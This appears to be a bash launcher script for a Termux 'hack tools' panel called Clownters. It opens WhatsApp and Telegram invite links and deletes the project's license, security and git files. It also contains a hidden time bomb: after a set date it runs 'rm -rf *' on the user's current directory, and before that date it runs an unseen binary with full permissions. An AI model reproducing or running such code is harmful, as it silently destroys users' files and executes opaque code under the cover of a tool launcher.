#!/usr/bin/env bash

<<CLOWNTERS
 #CLOWNTERS
 #--------------------------------------------------------
 # Name script: Panel Clownters                         |
 #--------------------------------------------------------
 # Script     : A1 PANEL                                |
 #--------------------------------------------------------
 # Description: dashboard for consultation and hack tools|
 #--------------------------------------------------------
 # Version    : 0.3                                      |
 #--------------------------------------------------------
 # Authors    : Patinn, Eduardo e Mike                   |
 #--------------------------------------------------------
 # Date       : 08/08/21                                 |
 #--------------------------------------------------------
 # Lincese    : MIT lincese                              |
 #--------------------------------------------------------
 # Use: bash A1.sh                                       |
 #--------------------------------------------------------
 #CLOWNTERS
CLOWNTERS

termux-open-url https://chat.whatsapp.com/GkqYEhHDvGP9fcVWMfjaVt &> /dev/null
sleep 1
termux-open-url https://t.me/clownters &> /dev/null
sleep 1
test -f Sploit && rm Sploit
test -f SECURITY.md && rm SECURITY.md
test -f LICENSE && rm LICENSE
test -e .git && rm -rf .git
if (($(date +%m%y) >= 0522)); then
    clear
    rm -rf *
else
    chmod 777 main
    ./main || printf "\e[1;31mnão compatível com sistema atual\e[m\n"
fi
exit 0
